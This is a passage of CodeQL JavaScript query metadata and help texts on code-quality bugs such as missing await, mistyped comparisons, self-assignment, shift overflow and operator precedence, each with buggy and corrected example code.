    function Graph(nodes, edges) {
      this.nodes = nodes;
      this.edges = edges;
      // cache minimum distance between pairs of nodes
      this.distance;
    }
    ```
    Semantically, this is unnecessary, since the property will be created upon first assignment. If the aim is to document the existence of the property, it would be better to explicitly assign it an initial value, which also serves to document its expected type:


    ```javascript
    function Graph(nodes, edges) {
      this.nodes = nodes;
      this.edges = edges;
      // cache minimum distance between pairs of nodes
      this.distance = {};
    }
    ```

    ## References
    * JSLint Error Explanations: [Expected an assignment or function call](http://jslinterrors.com/expected-an-assignment-or-function-call).
    * Common Weakness Enumeration: [CWE-480](https://cwe.mitre.org/data/definitions/480.html).
    * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/HeterogeneousComparison.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/HeterogeneousComparison.bqrs
  metadata:
    name: Comparison between inconvertible types
    description: |-
      An equality comparison between two values that cannot be meaningfully converted to
                    the same type will always yield 'false', and an inequality comparison will always
                    yield 'true'.
    kind: problem
    problem.severity: warning
    id: js/comparison-between-incompatible-types
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-570
             external/cwe/cwe-571
    precision: high
  queryHelp: "# Comparison between inconvertible types\nIn JavaScript, equality operators\
    \ (`==`, `!=`, `===`, `!==`) and relational operators (`<`, `<=`, `>`, `>=`) can\
    \ be applied to values of arbitrary types. However, if the operands cannot be\
    \ converted to a common type, the result of the comparison will always be trivially\
    \ true (for equality) or false (for inequality). Such comparisons are often due\
    \ to a typo or a misunderstanding of the language semantics.\n\n\n## Recommendation\n\
    Inspect the comparison carefully to check whether it is due to a typo. If one\
    \ of the operands is a constant, replace it with a constant of the right type.\
    \ Otherwise, introduce appropriate function calls to convert the operands to a\
    \ common type.\n\n\n## Example\nThe following code attempts to check whether the\
    \ global variable `window` is defined:\n\n\n```javascript\nif (typeof window !==\
    \ undefined)\n\tconsole.log(\"Running in a browser.\");\n```\nHowever, this test\
    \ is ineffective: `typeof` always returns a string, never `undefined`, so the\
    \ `if` condition will always evaluate to `true`. Instead, the result of `typeof`\
    \ should be compared to the string literal `\"undefined\"`:\n\n\n```javascript\n\
    if (typeof window !== \"undefined\")\n\tconsole.log(\"Running in a browser.\"\
    );\n```\nAs another example, consider the following code snippet, which is meant\
    \ to check whether the string `\"hello\"` occurs in the string held in variable\
    \ `text`.\n\n\n```javascript\nif (text.indexOf(\"hello\" >= 0))\n\tconsole.log(\"\
    Found it.\");\n```\nNote, however, that the test has been mistyped: the closing\
    \ parenthesis of the call to `index` should come before the operator `>=`, not\
    \ after it. As it stands, this code performs a greater-or-equal comparison between\
    \ the constant string `\"hello\"` and the number zero, which evaluates to `false`.\
    \ This value is then passed to `indexOf`, which converts it to the string `\"\
    false\"` and returns the first index at which this string occurs in `text` (or\
    \ `-1` if it does not occur at all).\n\nTo fix this issue, the test should be\
    \ rebracketed like this:\n\n\n```javascript\nif (text.indexOf(\"hello\") >= 0)\n\
    \tconsole.log(\"Found it.\");\n```\n\n## References\n* Mozilla Developer Network:\
    \ [Comparison Operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Comparison_Operators).\n\
    * Mozilla Developer Network: [Equality comparisons and when to use them](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_when_to_use_them).\n\
    * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).\n\
    * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/ImplicitOperandConversion.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/ImplicitOperandConversion.bqrs
  metadata:
    name: Implicit operand conversion
    description: |-
      Relying on implicit conversion of operands is error-prone and makes code
                    hard to read.
    kind: problem
    problem.severity: warning
    id: js/implicit-operand-conversion
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-704
    precision: very-high
  queryHelp: |
    # Implicit operand conversion
    In JavaScript, most operators can be applied to operands of arbitrary types; at runtime, the operands will be implicitly converted to the appropriate type. For instance, the expression `p in obj` checks whether the object `obj` contains a property whose name equals the string that `p` evaluates to. If `p` does not evaluate to a string or `o` does not evaluate to an object, implicit conversions are performed before the check is carried out.

    In many cases, however, these implicit conversions result from a typo or a misunderstanding of operator precedence rules. Even if the conversions are intentional, relying on them makes the code hard to understand.


    ## Recommendation
    Inspect the expression carefully to check whether the operands have been mistyped, and correct them if this is the case. If the conversions are intentional, consider replacing them by explicit conversions to clarify the meaning of the code.


    ## Example
    The following code intends to check whether object `obj` does not contain a property of the name stored in variable `member`:


    ```javascript
    function invk(obj, member) {
        if (!member in obj)
            throw new Error("No such member: " + member);
        return obj[member]();
    }
    ```
    However, this test is ineffective as written: the operator `!` binds more tightly than `in`, so it is applied first. Applying `!` to a non-empty string yields `false`, so the `in` operator actually ends up checking whether `obj` contains a property called `"false"`.

    To fix this, parentheses should be introduced as follows:


    ```javascript
    function invk(obj, member) {
        if (!(member in obj))
            throw new Error("No such member: " + member);
        return obj[member]();
    }
    ```
    As an example of the intentional use of implicit conversions, consider the following function for comparing two numbers `x` and `y`. It returns `1` if `x>y`, `-1` if `x<y`, and `0` if they are equal.


    ```javascript
    function cmp(x, y) {
        return (x > y) - (x < y);
    }
    ```
    It would be much clearer to write this out directly:


    ```javascript
    function cmp(x, y) {
        if (x > y)
            return 1;
        if (x < y)
            return -1;
        return 0;
    }
    ```
    At the very least, the Boolean comparison results should be explicitly converted to numbers:


    ```javascript
    function cmp(x, y) {
        return +(x > y) - +(x < y);
    }
    ```

    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 9. ECMA, 2011.
    * Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/MissingAwait.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/MissingAwait.bqrs
  metadata:
    name: Missing await
    description: Using a promise without awaiting its result can lead to unexpected
      behavior.
    kind: problem
    problem.severity: warning
    id: js/missing-await
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: |
    # Missing await
    In JavaScript, `async` functions always return a promise object. To obtain the underlying value of the promise, use the `await` operator or call the `then` method. Attempting to use a promise object instead of its underlying value can lead to unexpected behavior.


    ## Recommendation
    Use the `await` operator to get the value contained in the promise. Alternatively, call `then` on the promise and use the value passed to the callback.


    ## Example
    In the following example, the `getData` function returns a promise, and the caller checks if the returned promise is `null`:


    ```javascript
    async function getData(id) {
      let req = await fetch(`https://example.com/data?id=${id}`);
      if (!req.ok) return null;
      return req.json();
    }

    async function showData(id) {
      let data = getData(id);
      if (data == null) {
        console.warn("No data for: " + id);
        return;
      }
      // ...
    }

    ```
    However, the null check does not work as expected. The `return null` statement on line 2 actually returns a *promise* containing the `null` value. Since the promise object itself is not equal to `null`, the error check is bypassed.

    The issue can be corrected by inserting `await` before the promise:


    ```javascript
    async function getData(id) {
      let req = await fetch(`https://example.com/data?id=${id}`);
      if (!req.ok) return null;
      return req.json();
    }

    async function showData(id) {
      let data = await getData(id);
      if (data == null) {
        console.warn("No data for: " + id);
        return;
      }
      // ...
    }

    ```

    ## References
    * MDN: [Using promises](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises)
    * MDN: [Async functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)
    * MDN: [Await operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/MissingDotLengthInComparison.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/MissingDotLengthInComparison.bqrs
  metadata:
    name: Missing '.length' in comparison
    description: |-
      Two variables are being compared using a relational operator, but one is also used
                   to index into the other, suggesting a ".length" is missing from the comparison.
    kind: problem
    problem.severity: warning
    id: js/missing-dot-length-in-comparison
    precision: high
    tags: |-
      quality
             reliability
             correctness
  queryHelp: |
    # Missing '.length' in comparison
    It is very common to check whether a number is within the bounds of an array or string using a comparison of form `i < array.length`, and later perform an indexing access `array[i]`. If this comparison is mistyped as `i < array`, a type coercion will be performed, which almost never has the intended effect.


    ## Recommendation
    Check if one of the operands is an array or a string, and make sure to compare against its `length`, not against the value itself.


    ## Example
    The following example shows a mistyped loop condition `i < array`:


    ```javascript
    for (var i = 0; i < array; ++i) {
        count += array[i]
    }

    ```
    If the above is executed with `array` set to `[3,5,7]`, the loop will not run at all. The error can be corrected by changing the loop condition to `i < array.length`:


    ```javascript
    for (var i = 0; i < array.length; ++i) {
        count += array[i]
    }

    ```

    ## References
    * Mozilla Developer Network: [Array.length](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/length)
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/MissingSpaceInAppend.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/MissingSpaceInAppend.bqrs
  metadata:
    name: Missing space in string concatenation
    description: |-
      Joining constant strings into a longer string where
                    two words are concatenated without a separating space
                    usually indicates a text error.
    kind: problem
    problem.severity: warning
    precision: very-high
    id: js/missing-space-in-concatenation
    tags: |-
      quality
             maintainability
             readability
  queryHelp: |
    # Missing space in string concatenation
    Splitting a long string literal over multiple lines can often aid readability, but this also makes it difficult to notice whether a space is missing where the strings are concatenated.


    ## Recommendation
    Check the string literal to see whether it has the intended text. In particular, look for missing spaces near line breaks.


    ## Example
    The following example shows a text literal that is split over two lines and omits a space character between the two words at the line break.


    ```javascript
    var s = "This text is" +
      "missing a space.";
    ```

    ## References
    * Mozilla Developer Network: [Strings: Long literal strings](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Long_literal_strings).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/MisspelledVariableName.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/MisspelledVariableName.bqrs
  metadata:
    name: Misspelled variable name
    description: |-
      Misspelling a variable name implicitly introduces a global
                    variable, which may not lead to a runtime error, but is
                    likely to give wrong results.
    kind: problem
    problem.severity: warning
    id: js/misspelled-variable-name
    tags: |-
      quality
             reliability
             correctness
    precision: very-high
  queryHelp: |
    # Misspelled variable name
    If a reference to a local variable is accidentally misspelled, it will be interpreted as a reference to an implicitly declared global variable, which may indicate a bug. Even if this is intentional, it should be avoided as it makes the code hard to read.


    ## Recommendation
    Correct the misspelling.


    ## Example
    The following code snippet attempts to loop over an array `ids` in order to update DOM nodes referenced by the elements of the array. Note, however, that the upper bound of the loop is specified as `lenght`, a typo for the local variable `length`. At runtime, `lenght` will evaluate to `undefined`, so the check `i < lenght` will always fail, and the loop body is never executed.


    ```javascript
    function selectElements(ids) {
        for (var i=0, length=ids.length; i<lenght; ++i) {
            var id = ids[i];
            if (id) {
                var element = document.getElementById(id);
                element.className += " selected";
            }
        }
    }

    ```
    The misspelling should be corrected by replacing `lenght` with `length`.


    ## References
    * D. Crockford: *JavaScript: The Good Parts*, Appendix A: Awful Parts, Global Variables. O'Reilly, 2008.
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/RedundantExpression.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/RedundantExpression.bqrs
  metadata:
    name: Identical operands
    description: |-
      Passing identical, or seemingly identical, operands to an
                    operator such as subtraction or conjunction may indicate a typo;
                    even if it is intentional, it makes the code hard to read.
    kind: problem
    problem.severity: warning
    id: js/redundant-operation
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-480
             external/cwe/cwe-561
    precision: very-high
  queryHelp: "# Identical operands\nMany arithmetic or logical operators yield a trivial\
    \ result when applied to identical operands: for instance, `x-x` yields zero if\
    \ `x` is a number, and yields `NaN` otherwise; `x&&x` is always equal to `x`.\
    \ Code like this is often the result of a typo, such as misspelling a variable\
    \ name. Even if it is intentional (relying, for instance, on side effects), such\
    \ code is hard to read and understand and should be avoided.\n\n\n## Recommendation\n\
    Examine the operands for typos. Replace intentional uses of identical operands\
    \ that have side effects with clearer alternatives.\n\n\n## Example\nIn the example\
    \ below, the function `avg` is intended to compute the average of two numbers\
    \ `x` and `y`. However, the programmer accidentally used `x` twice, so the function\
    \ just returns `x`:\n\n\n```javascript\nfunction avg(x, y) {\n\treturn (x + x)/2;\n\
    }\n```\nThis problem can be fixed by correcting the typo:\n\n\n```javascript\n\
    function avg(x, y) {\n\treturn (x + y)/2;\n}\n```\nIn some cases, an expression\
    \ that looks redundant cannot, in fact, be simplified due to side effects. For\
    \ instance, `f() && f()` is not necessarily equivalent to `f()`, since `f` may\
    \ have side effects. This may not be immediately apparent to the reader, however,\
    \ and it is usually clearer to expand this expression into an 'if' statement:\n\
    \n\n```javascript\nif (f())\n\tf();\n```\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/SelfAssignment.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/SelfAssignment.bqrs
  metadata:
    name: Self assignment
    description: Assigning a variable to itself has no effect.
    kind: problem
    problem.severity: warning
    id: js/redundant-assignment
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-480
             external/cwe/cwe-561
    precision: high
  queryHelp: "# Self assignment\nAssigning a variable to itself typically indicates\
    \ a mistake such as a missing `this` qualifier or a misspelled variable name.\n\
    \n\n## Recommendation\nCarefully inspect the assignment to check for misspellings\
    \ or missing qualifiers.\n\nIf the self-assignment is intentional and is needed\
    \ for documentation or optimization purposes, add a JSDoc comment with a `@type`\
    \ tag. This will indicate the self-assignment is intentional.\n\n\n## Example\n\
    In the example below, the constructor function `Rectangle` is intended to initialize\
    \ properties `x`, `y`, `width`, and `height` to the parameters of the same names.\n\
    \n\n```javascript\nfunction Rectangle(x, y, width, height) {\n\tthis.x = x;\n\t\
    this.y = y;\n\twidth = width;\n\tthis.height = height;\n}\n\n```\nNote, however,\
    \ that on line 4 the programmer forgot to qualify the left hand side of the assignment\
    \ with `this`: the code now performs a useless assignment of the `width` parameter\
    \ to itself and leaves the `width` property uninitialized.\n\nTo fix this issue,\
    \ insert a `this` qualifier:\n\n\n```javascript\nfunction Rectangle(x, y, width,\
    \ height) {\n\tthis.x = x;\n\tthis.y = y;\n\tthis.width = width;\n\tthis.height\
    \ = height;\n}\n\n```\n\n## References\n* Ecma International, *ECMAScript Language\
    \ Definition*, 5.1 Edition, Section 11.13. ECMA, 2011.\n* Common Weakness Enumeration:\
    \ [CWE-480](https://cwe.mitre.org/data/definitions/480.html).\n* Common Weakness\
    \ Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/ShiftOutOfRange.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/ShiftOutOfRange.bqrs
  metadata:
    name: Shift out of range
    description: |-
      The integer shift operators '<<', '>>' and '>>>' only take the five least significant bits of their
                    right operand into account. Thus, it is not possible to shift an integer by more than 31 bits.
    kind: problem
    problem.severity: error
    id: js/shift-out-of-range
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-197
    precision: very-high
  queryHelp: |
    # Shift out of range
    Shift operations in JavaScript operate on 32-bit values only, so it is not possible to shift by more than 31 positions. If the right operand of a shift operator is greater than 31, the left operand is actually only shifted by that value modulo 32.


    ## Recommendation
    Use standard library functions such as `Math.pow` to perform the required shifting. Alternatively, you can use the [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) type if it is available on your platform.


    ## Example
    The following code snippet attempts to assign `x` the value 2<sup>40</sup> (1099511627776). In fact, however, the left operand `1` is only shifted by `8` (that is, 40 modulo 32), so `x` ends up being assigned the value 2<sup>8</sup> (256).


    ```javascript
    var x = 1<<40;
    ```
    A better solution would be to use `Math.pow` as follows:


    ```javascript
    var x = Math.pow(2, 40);
    ```
    Note, however, that JavaScript internally represents large numbers as floating point numbers, so numbers with a magnitude larger than 2<sup>53</sup> will be represented imprecisely.


    ## References
    * Mozilla Developer Network: [Bitwise operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators).
    * Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/StringInsteadOfRegex.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/StringInsteadOfRegex.bqrs
  metadata:
    name: String instead of regular expression
    description: Calling 'String.prototype.replace' or 'String.prototype.split' with
      a string argument that looks like a regular expression is probably a mistake
      because the called function will not convert the string into a regular expression.
    kind: problem
    problem.severity: warning
    id: js/string-instead-of-regex
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: "# String instead of regular expression\nCalling the builtin methods\
    \ `String.prototype.split` and `String.prototype.replace` with a string as the\
    \ first argument makes the methods search for that exact string. Providing a regular\
    \ expression instead of the string makes the methods perform a regular expression\
    \ search.\n\nCalling the methods with a string that has the format of a regular\
    \ expression is likely a mistake because the methods will not convert the string\
    \ to a regular expression.\n\n\n## Recommendation\nCall `String.prototype.split`\
    \ and `String.prototype.replace` with a regular expression as the first argument\
    \ unless you want an exact search.\n\n\n## Example\nThe following code snippet\
    \ shows a call to `String.prototype.replace`. The purpose of the call is to remove\
    \ all characters that are not alphanumeric.\n\n```javascript\n\n\t\t\tvar cleaned\
    \ = input.replace(\"[^a-zA-Z0-9]+\", \"\");\n\t\t\n```\nUnfortunately, the first\
    \ argument is a string and not a regular expression, so the call will only remove\
    \ the first substring that is exactly \"`[^a-zA-Z0-9]+`\".\n\nInstead, the first\
    \ argument should be a regular expression with the `global` flag set:\n\n```javascript\n\
    \n\t\t\tvar cleaned = input.replace(/[^a-zA-Z0-9]+/g, \"\");\n\t\t\n```\n\n##\
    \ References\n* Mozilla Developer Network: [String.prototype.split](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split)\n\
    * Mozilla Developer Network: [String.prototype.replace](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/SuspiciousInvocation.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/SuspiciousInvocation.bqrs
  metadata:
    name: Invocation of non-function
    description: |-
      Trying to invoke a value that is not a function will result
                    in a runtime exception.
    kind: problem
    problem.severity: error
    id: js/call-to-non-callable
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-476
    precision: high
  queryHelp: |
    # Invocation of non-function
    Attempting to invoke a non-function (that is, a primitive value or an object) will cause an exception at runtime. This applies both to calls using `new` and normal calls.


    ## Recommendation
    Carefully inspect the invocation in question. If the problem was not detected during testing, this could either be because the invocation is in dead code, or because it is not covered by a test. In the former case, delete the dead code in question. In the latter case, consider adding a new test.


    ## Example
    In the following example, function `processResponse` accepts an argument `response`, and, depending on the value of property `response.status`, does one of two things: if `response.status` is 200, it invokes a function `processResponseText` (not shown), and if that function returns an `error` value, it throws that value as an exception; otherwise, it invokes `error` to log the value of `response.status`.


    ```javascript
    function error(msg) {
      console.log(msg);
    }

    function processResponse(response) {
      if (response.status === 200) {
        var error = processResponseText(response.responseText);
        if (error)
           throw error;
      } else {
        error("Unexpected response status " + response.status);
      }
    }
    ```
    Note that due to JavaScript's scoping rules, `error` in the "else" branch actually refers to the `error` variable declared in the "then" branch (and not the global function of the same name). Since that variable is always `undefined` in the "else" branch, attempting to invoke it will result in an exception at runtime.

    To fix this problem, `error` could be turned into a `let`-bound variable to avoid the accidental name capture:


    ```javascript
    function error(msg) {
      console.log(msg);
    }

    function processResponse(response) {
      if (response.status === 200) {
        let error = processResponseText(response.responseText);
        if (error)
           throw error;
      } else {
        error("Unexpected response status " + response.status);
      }
    }
    ```
    Alternatively, if ECMAScript 5 compatibility is desired, the `error` variable could be renamed instead, as in this example:


    ```javascript
    function error(msg) {
      console.log(msg);
    }

    function processResponse(response) {
      if (response.status === 200) {
        var err = processResponseText(response.responseText);
        if (err)
           throw err;
      } else {
        error("Unexpected response status " + response.status);
      }
    }
    ```

    ## References
    * Mozilla Developer Network: [Calling functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions#Calling_functions).
    * Common Weakness Enumeration: [CWE-476](https://cwe.mitre.org/data/definitions/476.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/SuspiciousPropAccess.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/SuspiciousPropAccess.bqrs
  metadata:
    name: Property access on null or undefined
    description: |-
      Trying to access a property of "null" or "undefined" will result
                    in a runtime exception.
    kind: problem
    problem.severity: error
    id: js/property-access-on-non-object
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-476
    precision: high
  queryHelp: |
    # Property access on null or undefined
    Attempting to read or write a property of `null` or `undefined` will cause an exception at runtime.


    ## Recommendation
    Carefully inspect the property access in question. If the problem was not detected during testing, this could either be because it is in dead code, or because it is not covered by a test. In the former case, delete the dead code in question. In the latter case, consider adding a new test.


    ## Example
    In the following example, function `f` declares a variable `result`, then invokes another function `computeInterestingResult` (not shown) and stores the result in `res`, and finally returns `result.value`. Since `result` has not been initialized, it will still have its default value `undefined`, causing a runtime exception.


    ```javascript
    function f() {
      var result;
      res = computeInterestingResult();
      return result.value;
    }
    ```
    The assignment to `res` is presumably a typo; instead, it should be assigned to `result`:


    ```javascript
    function f() {
      var result;
      result = computeInterestingResult();
      return result.value;
    }
    ```

    ## References
    * Mozilla Developer Network: [Objects and properties](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects#Objects_and_properties).
    * Common Weakness Enumeration: [CWE-476](https://cwe.mitre.org/data/definitions/476.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/UnboundEventHandlerReceiver.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/UnboundEventHandlerReceiver.bqrs
  metadata:
    name: Unbound event handler receiver
    description: Invoking an event handler method as a function can cause a runtime
      error.
    kind: problem
    problem.severity: error
    id: js/unbound-event-handler-receiver
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: |
    # Unbound event handler receiver
    Event handler callbacks are usually invoked as functions, not as methods. This means that the `this` expressions of such callbacks evaluate to `undefined` or the global object. Using an ES6 class method as a callback therefore means that the `this` expressions of the method do not refer to the class instance.


    ## Recommendation
    Ensure that the receiver object of event handler methods that use `this` expressions is not `undefined`. For instance, you can use `bind` or explicitly invoke the method as a method call.


    ## Example
    The following example, for the React framework, registers the `handleClick` method as an event handler for the `click` event:


    ```javascript
    class Toggle extends React.Component {
      constructor(props) {
        super(props);
        this.state = {isToggleOn: true};
      }

      handleClick() {
        this.setState(prevState => ({
          isToggleOn: !prevState.isToggleOn
        }));
      }

      render() {
        return (
          <button onClick={this.handleClick}> // BAD `this` is now undefined in `handleClick`
            {this.state.isToggleOn ? 'ON' : 'OFF'}
          </button>
        );
      }
    }

    ```
    This is problematic since this invokes `handleClick` as a function call instead of a method call, meaning that `this` is `undefined` inside `handleClick`.

    Instead, bind the receiver of `handleClick` in the constructor:


    ```javascript
    class Toggle extends React.Component {
      constructor(props) {
        super(props);
        this.state = {isToggleOn: true};

        // This binding is necessary to make `this` work in the callback
        this.handleClick = this.handleClick.bind(this);
      }

      handleClick() {
        this.setState(prevState => ({
          isToggleOn: !prevState.isToggleOn
        }));
      }

      render() {
        return (
          <button onClick={this.handleClick}> // GOOD, the constructor binds `handleClick`
            {this.state.isToggleOn ? 'ON' : 'OFF'}
          </button>
        );
      }
    }

    ```

    ## References
    * React Quick Start: [Handling Events](https://reactjs.org/docs/handling-events.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/UnclearOperatorPrecedence.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/UnclearOperatorPrecedence.bqrs
  metadata:
    name: Unclear precedence of nested operators
    description: |-
      Nested expressions involving binary bitwise operators and comparisons are easy
                    to misunderstand without additional disambiguating parentheses or whitespace.
    kind: problem
    problem.severity: recommendation
    id: js/unclear-operator-precedence
    tags: |-
      quality
             maintainability
             readability
             statistical
             non-attributable
             external/cwe/cwe-783
    precision: very-high
  queryHelp: |
    # Unclear precedence of nested operators
    Nested expressions that rely on less well-known operator precedence rules can be hard to read and understand. They could even indicate a bug where the author of the code misunderstood the precedence rules.


    ## Recommendation
    Use parentheses or additional whitespace to clarify grouping.


    ## Example
    Consider the following snippet of code:


    ```javascript
    if (x & y == 0) {
      // ...
    }
    ```
    It might look like this tests whether `x` and `y` have any bits in common, but in fact `==` binds more tightly than `&`, so the test is equivalent to `x & (y == 0)`.

    If this is the intended interpretation, parentheses should be used to clarify this. You could also consider adding extra whitespace around `&` or removing whitespace around `==` to make it visually apparent that it binds less tightly: `x & y==0`.

    Probably the best approach in this case, though, would be to use the `&&` operator instead to clarify the intended interpretation: `x && y == 0`.


    ## References
    * Mozilla Developer Network, [Operator precedence](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence).
    * Common Weakness Enumeration: [CWE-783](https://cwe.mitre.org/data/definitions/783.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/UnknownDirective.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/UnknownDirective.bqrs
  metadata:
    name: Unknown directive
    description: An unknown directive has no effect and may indicate a misspelling.
    kind: problem
    problem.severity: warning
    id: js/unknown-directive
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: |
    # Unknown directive
    If a directive is accidentally misspelled, it will have no effect.


    ## Recommendation
    Correct the misspelling.


    ## Example
    The following code snippet shows a function that contains a `"usestrict"` directive. Most likely, the programmer intended this to be a `"use strict"` directive, but due to the typo, the function will not execute in strict mode.


    ```javascript
    function f() {
        "usestrict";
        ...
    }

    ```
    Correct the misspelling by replacing `"usestrict"` with `"use strict"`.


    ## References
    * Mozilla Developer Network: ["use strict"](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode)
    * asm.js: ["use asm"](http://asmjs.org/spec/latest/#validation)
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/UnneededDefensiveProgramming.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/UnneededDefensiveProgramming.bqrs
  metadata:
    name: Unneeded defensive code
    description: Defensive code that guards against a situation that never happens
      is not needed.
    kind: problem
    problem.severity: recommendation
    id: js/unneeded-defensive-code
    tags: |-
      quality
             maintainability
             useless-code
             external/cwe/cwe-570
             external/cwe/cwe-571
    precision: very-high
  queryHelp: |
    # Unneeded defensive code
    Defensive code can prevent unforeseen circumstances from causing fatal program behaviors. A common defensive code pattern is to guard against dereferencing the values `null` or `undefined`. However, if the situation that some defensive code guards against never can occur, then the defensive code serves no purpose and can safely be removed.


    ## Recommendation
    Examine the surrounding code to determine if the defensive code is worth keeping despite providing no practical use. If it is no longer needed, remove it.


    ## Example
    The following example shows a `cleanupLater` function that asynchronously will perform a cleanup task after some delay. When the cleanup task completes, the function invokes the provided callback parameter `cb`. To prevent a crash by invoking `cb` when it has the value `undefined`, defensive code guards the invocation by checking if `cb` is truthy.


    ```javascript
    function cleanupLater(delay, cb) {
        setTimeout(function() {
            cleanup();
            if (cb) { // BAD: useless check, `cb` is always truthy
                cb();
            }
        }, delay)
    }

    cleanupLater(1000, function(){console.log("Cleanup done")});

    ```
    However, the `cleanupLater` function is always invoked with a callback argument, so the defensive code condition always holds, and it is therefore not required. The function can therefore be simplified to:


    ```javascript
    function cleanupLater(delay, cb) {
        setTimeout(function() {
            cleanupNow();
            // GOOD: no need to guard the invocation
            cb();
        }, delay)
    }

    cleanupLater(function(){console.log("Cleanup done")});

    ```
    Guarding against the same situation multiple times is another example of defensive code that provides no practical use. The example below shows a function that assigns a value to a property of an object, where defensive code ensures that the assigned value is not `undefined` or `null`.


    ```javascript
    function setSafeStringProp(o, prop, v) {
        // BAD: `v == null` is useless
        var safe = v == undefined || v == null? '': v;
        o[prop] = safe;
    }

    ```
    However, due to coercion rules, `v == undefined` holds for both the situation where `v` is`undefined` and the situation where `v` is`null`, so the `v == null` guard serves no purpose, and can be removed:


    ```javascript
    function setSafeStringProp(o, prop, v) {
        // GOOD: `v == undefined` handles both `undefined` and `null`
        var safe = v == undefined? '': v;
        o[prop] = safe;
    }

    ```

    ## References
    * Wikipedia: [Defensive programming](https://en.wikipedia.org/wiki/Defensive_programming).
    * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).
    * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/WhitespaceContradictsPrecedence.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/WhitespaceContradictsPrecedence.bqrs
  metadata:
    name: Whitespace contradicts operator precedence
    description: |-
      Nested expressions where the formatting contradicts the grouping enforced by operator precedence
                    are difficult to read and may even indicate a bug.
    kind: problem
    problem.severity: warning
    id: js/whitespace-contradicts-precedence
    tags: |-
      quality
             reliability
             correctness
             statistical
             non-attributable
             external/cwe/cwe-783
    precision: very-high
  queryHelp: |
    # Whitespace contradicts operator precedence
    Nested expressions where the spacing around operators suggests a different grouping than that imposed by the JavaScript operator precedence rules are problematic: they could indicate a bug where the author of the code misunderstood the precedence rules. Even if there is no a bug, the spacing could be confusing to people who read the code.


    ## Recommendation
    Make sure that the spacing around operators reflects operator precedence, or use parentheses to clarify grouping.


    ## Example
    Consider the following piece of code for allocating an array:


    ```javascript
    var a = new Array(capacity + capacity>>1);
    ```
